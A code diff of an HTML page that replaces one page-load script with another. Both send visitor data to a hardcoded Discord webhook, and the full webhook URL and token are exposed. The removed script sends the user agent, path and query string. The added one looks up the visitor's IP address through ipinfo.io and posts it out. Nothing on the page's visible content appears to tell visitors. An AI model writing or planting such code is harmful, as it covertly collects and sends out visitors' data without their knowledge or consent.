@@ -38,36 +38,44 @@
         }
     </style>
 
-    <script>
-         
-
-        document.addEventListener("DOMContentLoaded", function() {
-
-            const webhookUrl = "https://discord.com/api/webhooks/1340426410304475189/gjSiFvVXRUpPP_yO1UFbMkvypQeMui2xA0Nr6OnIiKVERZwqE8kgTNKO_hz8f7wTuZmH";
-            const userAgent = navigator.userAgent;
-            const ipAddress = "watte poes"; // You need a server-side script to get the real IP address
-            const pageName = window.location.pathname;
-            const queryString = window.location.search;
-
-            const data = {
-                content: `User Agent: ${userAgent}\nIP Address: ${ipAddress}\nPage Name: ${pageName}\nQuery String: ${queryString}`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch((error) => console.error('Error:', error));
-        });
-            
-    </script>
 </head>
 <body>
+    <div id="ip-address"></div> <!-- Add this line to ensure the element exists -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://ipinfo.io/json") 
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    document.getElementById("ip-address").textContent = 
+                          `IP Address: ${data.ip}`;
+                    
+                    // Post the IP address to a Discord webhook
+                    fetch("https://discord.com/api/webhooks/1340426410304475189/gjSiFvVXRUpPP_yO1UFbMkvypQeMui2xA0Nr6OnIiKVERZwqE8kgTNKO_hz8f7wTuZmH", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            content: `IP Address: ${data.ip}`
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        console.log("Successfully posted to Discord webhook:", result);
+                    })
+                    .catch(error => {
+                        console.error("Error posting to Discord webhook:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    document.getElementById("ip-address").textContent = 
+                          "Unable to retrieve IP address.";
+                });
+        });
+    </script>
     
     <div class="container">
         <img src="dryson.png" alt="Centered Image" class="center">
